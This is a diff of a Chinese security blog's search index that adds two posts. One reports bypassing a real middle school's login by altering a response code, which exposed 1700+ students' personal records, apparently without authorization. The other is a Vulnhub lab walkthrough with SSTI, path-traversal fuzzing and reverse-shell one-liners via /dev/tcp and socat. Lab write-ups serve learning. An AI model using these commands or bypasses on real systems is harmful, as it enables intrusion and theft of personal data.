@@ -4,13 +4,50 @@
   
   
   <entry>
-    <title>Hello World</title>
-    <link href="/2026/01/17/hello-world/"/>
-    <url>/2026/01/17/hello-world/</url>
+    <title>某中学登录逻辑漏洞</title>
+    <link href="/2026/01/19/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2026/01/19/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<p>前期对目标站点进行信息收集发现一处登录系统</p><p><img src="/2026/01/19/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20260119162403515.png"></p><p>更改<code>result_code</code>为<code>200</code>放行即可进行绕过，进入后台</p><p><img src="/2026/01/19/%E6%9F%90%E4%B8%AD%E5%AD%A6%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/image-20260119161710219.png"></p><p>发现1700+条敏感信息，包括身份证、电话姓名等信息。</p>]]></content>
     
     
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Orasi</title>
+    <link href="/2026/01/19/Orasi/"/>
+    <url>/2026/01/19/Orasi/</url>
+    
+    <content type="html"><![CDATA[<p>首先使用<code>arp-scan</code>探测目标机器，发现IP地址为<code>192.168.182.228</code></p><p><img src="/2026/01/19/Orasi/image-20260119134233384.png"></p><p>先用<code>sudo nmap --min-rate 10000 192.168.182.228</code>进行一个快速扫描，知道开放了以下几个端口</p><p><img src="/2026/01/19/Orasi/clip_image002.gif"></p><p>利用<code>gobuster</code>进行目录扫描，<code>sudo gobuster dir -u http://192.168.182.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,xml,txt,bak</code>，但是并没有发现有价值的信息</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801703588-2.gif"></p><p>那么先访问一下80端口，目前还不知道这条信息的含义</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801789390-4.gif"></p><p>5000端口Not Found</p><p><img src="/2026/01/19/Orasi/clip_image002-1768801882735-6.gif"></p><p>回到一开始<code>nmap</code>的扫描结果，知道有一个<code>FTP</code>服务，那么尝试是否可以进行匿名登录</p><p><img src="/2026/01/19/Orasi/image-20260119135231607.png"></p><p>可以进行匿名登录，而且在pub目录下还有一个名为<code>url</code>的文件，把它下载到本地进行分析</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802078586-11.gif"></p><p>发现是<code>ELF</code>格式文件，<em>(它是一种通用的文件格式，广泛用于<code>Unix</code>和<code>Linux</code>系统上的可执行文件、目标代码文件、共享库和核心转储文件)</em>。把该文件扔到<code>IDA</code>打开</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802426465-13.gif"></p><p>发现在<code>main</code>中的<code>insert</code>函数会调用以上这几个值</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802501769-15.gif"></p><p>直接来看寄存器的值，发现以上几个字符连成一起得到<code>/sh4d0w$s</code>关键字，猜测是一个文件名或隐藏目录，那么尝试进行拼接</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802639477-17.gif"></p><p>80端口显示Not Found，但是在<code>5000</code>端口发生变化</p><p><img src="/2026/01/19/Orasi/clip_image002-1768802681118-19.gif"></p><p>提示说<code>No input</code>，应该是需要输入些内容但是不知道具体参数，尝试进行Fuzz模糊测试：根据<code>80</code>端口的页面内容<code>6 6 1337leet</code>以及使用工具<code>crunch</code>进行字典组合</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803073480-21.gif"></p><p>得到一份由<code>6 6 1337leet</code>分解又组合的字典，随后利用<code>ffuf</code>模糊测试工具进行Fuzz</p><p><code>ffuf -u &quot;http://192.168.182.228:5000/sh4d0w\$s?FUZZ=../../../../../../../etc/passwd&quot; -w cert1.txt -fs 8</code></p><p><img src="/2026/01/19/Orasi/clip_image002-1768803173766-23.gif"></p><p>成功得到隐藏参数<code>l333tt</code>，但是执行命令后会直接打印输出到界面</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803358612-25.gif"></p><p>通过浏览器插件或控制台知道有Python的服务，尝试进行<code>SSTI</code>模版注入攻击</p><p><img src="/2026/01/19/Orasi/clip_image002-1768803453569-27.gif"></p><p>构造SSTI的Payload进行测试</p><p><img src="/2026/01/19/Orasi/image-20260119142923781.png"></p><p>可以看到执行成功，那么再把Payload进行<code>URL编码</code>进行反弹shell到kali</p><p><img src="/2026/01/19/Orasi/clip_image002-1768804266435-29.gif"></p><p>kali监听到了shell并发现有一个名为<code>pyth0ns3rv3ros.py</code>的文件，接下来进行提权</p><p><img src="/2026/01/19/Orasi/clip_image002-1768804386125-31.gif"></p><p>发现能执行<code>jail.php</code>脚本文件，查看文件内容可知：该文件会执行命令，但是会进行匹配关键字如bash、eval、nc等危险字符。</p><p>后面尝试了几个shell语句都有问题</p><p><code>sudo -u kori /bin/bash /home/kori/jail.php sh -i &gt;&amp; /dev/tcp/192.168.182.249/4435 0&gt;&amp;1</code></p><p><code>sudo -u kori /bin/bash /home/kori/jail.php 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.182.249/4435; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p><p>只有下面这条可以</p><p><code>sudo -u kori /bin/php /home/kori/jail.php socat TCP:192.168.182.249:4435 EXEC:sh</code></p><p><img src="/2026/01/19/Orasi/clip_image002-1768807029704-33.gif"></p><p>成功获取<code>kori</code>用户的shell</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807105122-35.gif"></p><p>发现有<code>(irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk</code>，那可以直接将该apk文件复制到<code>/home/kori</code>目录下，但是发现并不允许</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807387055-37.gif"></p><p>可以对<code>kori</code>的家目录赋予其他用户访问的权限，再创建一个同名文件把apk文件复制过来</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807496928-39.gif"></p><p>现在能访问该文件了，然后拖到<code>AndroidKiller</code>工具中进行分析，在<code>LoginDataSource.smail</code>中发现有像用户名和密码的东西</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807702953-41.gif"></p><p>观察后发现，参数一为<code>irida</code>，参数二采取了某种密码保护机制，对应下面的0.1.2.3.4字符串，对其进行拼接得到<code>eye.of.the.tiger.()</code>，尝试切换<code>irida</code>用户提示密码错误，在靶机的介绍页面得知提示<code>just one useless little dot</code>，最后得到正确密码：<code>eye.of.the.tiger()</code>。</p><p><img src="/2026/01/19/Orasi/clip_image002-1768807910172-43.gif"></p><p>看一下当前用户能使用哪些特权命令，发现存在<code>oras.py</code>文件</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808036295-45.gif"></p><p>尝试运行发现报错，根据报错信息应该是要输入16进制字符串，那么将nc反弹shell的payload转换成字符串，再使用<code>.hex()</code>方法将字符串转换成16进制形式</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808233898-47.gif"></p><p>kali成功监听到shell</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808498834-49.gif"></p><p>获取到最终的Flag</p><p><img src="/2026/01/19/Orasi/clip_image002-1768808522640-51.gif"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Vulnhub</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Vulnhub</tag>
+      
+    </tags>
     
   </entry>
   
